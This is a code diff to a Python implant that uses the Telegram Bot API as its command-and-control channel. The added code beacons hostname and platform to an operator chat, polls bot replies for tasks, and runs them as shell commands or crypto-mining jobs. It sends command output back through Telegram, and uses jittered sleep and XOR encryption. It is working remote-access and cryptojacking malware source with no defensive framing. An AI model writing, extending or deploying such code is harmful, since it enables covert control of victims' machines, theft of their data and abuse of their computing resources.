@@ -115,6 +115,9 @@ def xor_crypt(data: bytes, key: bytes) -> bytes:
     return bytes(b ^ key[i % kl] for i, b in enumerate(data))
 
 # ─── Telegram C2 ──────────────────────────────────────────────────────────────
+# Global offset for polling
+_telegram_offset = 0
+
 def telegram_send(message: str) -> dict:
     """Send message via Telegram Bot API."""
     if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
@@ -143,6 +146,50 @@ def telegram_send(message: str) -> dict:
     except Exception as e:
         log(f"Telegram error: {e}", "ERROR")
         return {"ok": False, "error": str(e)}
+
+def telegram_poll_replies(agent_id: str) -> list:
+    """Poll for replies from bot containing commands.
+    
+    Returns list of commands from bot replies.
+    """
+    global _telegram_offset
+    commands = []
+    
+    try:
+        # Get updates since last offset
+        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/getUpdates?offset={_telegram_offset + 1}&limit=10&timeout=1"
+        req = Request(url, headers={"User-Agent": "Mozilla/5.0"})
+        resp = urlopen(req, timeout=5)
+        result = json.loads(resp.read().decode())
+        
+        if result.get("ok"):
+            for update in result.get("result", []):
+                _telegram_offset = update.get("update_id", _telegram_offset)
+                
+                if "message" in update:
+                    msg = update["message"]
+                    text = msg.get("text", "")
+                    chat_id = msg["chat"]["id"]
+                    
+                    # Check if this is a command reply (contains Task #)
+                    if "Task #" in text or "📋" in text:
+                        # Parse command from reply
+                        # Format: "📋 Task #1\nType: exec\nCommand: whoami"
+                        task_match = re.search(r'Task #(\d+)', text)
+                        type_match = re.search(r'Type:\s*(\w+)', text)
+                        cmd_match = re.search(r'Command:\s*(.+)', text)
+                        
+                        if task_match and cmd_match:
+                            commands.append({
+                                "id": task_match.group(1),
+                                "type": type_match.group(1) if type_match else "exec",
+                                "command": cmd_match.group(1).strip()
+                            })
+                            log(f"Got command from bot reply: Task #{task_match.group(1)}", "TASK")
+    except Exception as e:
+        log(f"Telegram poll error: {e}", "DEBUG")
+    
+    return commands
 
 def telegram_get_commands(agent_id: str) -> list:
     """Get pending commands from Telegram bot via C2 database sync.
@@ -215,16 +262,24 @@ def telegram_report_result(agent_id: str, task_id: int, result: str, success: bo
         log(f"Result report error: {e}", "DEBUG")
 
 def telegram_beacon_loop(agent_id: str, sleep: int = 3, jitter: int = 5):
-    """Telegram C2 beacon loop - send beacons and get commands via Telegram API."""
+    """Telegram C2 beacon loop - true bridge via Telegram API.
+    
+    Architecture:
+    1. Agent sends beacon to admin chat
+    2. Bot receives beacon, checks DB for tasks
+    3. Bot replies with commands to admin chat
+    4. Agent polls replies and executes commands
+    5. Agent sends result back
+    
+    No public URLs needed - pure Telegram bridge.
+    """
     import random
     
     _total_beacons = 0
     _total_tasks = 0
     
-    # Get C2 URL from env (for HTTP beacon to public server)
-    c2_url = os.environ.get("C2_URL", "")
-    
-    log(f"Telegram beacon loop started (agent={agent_id[:8]})", "START")
+    log(f"Telegram bridge loop started (agent={agent_id[:8]})", "START")
+    log(f"Mode: Pure Telegram bridge (no HTTP)", "START")
     
     while True:
         try:
@@ -236,35 +291,16 @@ def telegram_beacon_loop(agent_id: str, sleep: int = 3, jitter: int = 5):
             
             beacon_msg = f"""📡 <b>Beacon #{_total_beacons}</b>
 
-Agent: <code>{agent_id[:8]}</code>
+Agent: <code>{agent_id}</code>
 Hostname: {hostname}
 Platform: {platform_type}
 Time: {time.strftime('%H:%M:%S')}
-"""
+Ready for commands"""
             telegram_send(beacon_msg)
-            log(f"Beacon #{_total_beacons} sent via Telegram", "CONN")
+            log(f"Beacon #{_total_beacons} sent via Telegram bridge", "CONN")
             
-            # Get commands - try HTTP first, then local DB
-            commands = []
-            
-            # Try HTTP beacon to C2 server (public URL or localhost)
-            if c2_url:
-                try:
-                    resp = http_post("/api/agent/beacon", {"id": agent_id}, c2_url, None, None)
-                    if resp and "tasks" in resp:
-                        for t in resp.get("tasks", []):
-                            commands.append({
-                                "id": t.get("id"),
-                                "type": t.get("task_type", "exec"),
-                                "command": t.get("payload", "")
-                            })
-                        log(f"Got {len(commands)} tasks via HTTP from {c2_url}", "TASK")
-                except Exception as e:
-                    log(f"HTTP beacon failed: {e}", "DEBUG")
-            
-            # Fallback: check local DB (if running on same machine as C2)
-            if not commands:
-                commands = telegram_get_commands(agent_id)
+            # Poll for replies from bot (commands)
+            commands = telegram_poll_replies(agent_id)
             
             # Process commands
             for cmd in commands:
@@ -273,14 +309,13 @@ Time: {time.strftime('%H:%M:%S')}
                 task_type = cmd.get("type", "exec")
                 command = cmd.get("command", "")
                 
-                log(f"Executing command #{_total_tasks}: {task_type}", "TASK")
+                log(f"Executing command #{_total_tasks}: {task_type} - {command}", "TASK")
                 
                 try:
                     # Execute command
                     if task_type == "exec":
                         result = shell_exec(command)
                     elif task_type == "mine":
-                        # Start mining
                         result = start_mining(command)
                     elif task_type == "control" and command == "stop":
                         log("Stop command received, exiting", "TASK")
@@ -289,14 +324,25 @@ Time: {time.strftime('%H:%M:%S')}
                     else:
                         result = execute_task({"task_type": task_type, "command": command})
                     
-                    log(f"Command {task_id} completed", "TASK")
+                    log(f"Command {task_id} completed: {len(result)} chars", "TASK")
                     
-                    # Report result
-                    telegram_report_result(agent_id, task_id, result, success=True)
+                    # Send result back via Telegram
+                    result_msg = f"""✅ <b>Task #{task_id} Completed</b>
+
+Agent: <code>{agent_id[:8]}</code>
+Command: {command}
+Result:
+<code>{result[:500]}</code>"""
+                    telegram_send(result_msg)
                     
                 except Exception as e:
                     log(f"Command {task_id} failed: {e}", "ERROR")
-                    telegram_report_result(agent_id, task_id, str(e), success=False)
+                    error_msg = f"""❌ <b>Task #{task_id} Failed</b>
+
+Agent: <code>{agent_id[:8]}</code>
+Command: {command}
+Error: {e}"""
+                    telegram_send(error_msg)
             
             # Sleep with jitter
             jitter_s = sleep * jitter / 100
@@ -305,10 +351,10 @@ Time: {time.strftime('%H:%M:%S')}
             time.sleep(actual_sleep)
             
         except KeyboardInterrupt:
-            log("Telegram beacon loop stopped", "STOP")
+            log("Telegram bridge loop stopped", "STOP")
             break
         except Exception as e:
-            log(f"Telegram beacon error: {e}", "ERROR")
+            log(f"Telegram bridge error: {e}", "ERROR")
             time.sleep(5)
 
 def start_mining(config: str) -> str:
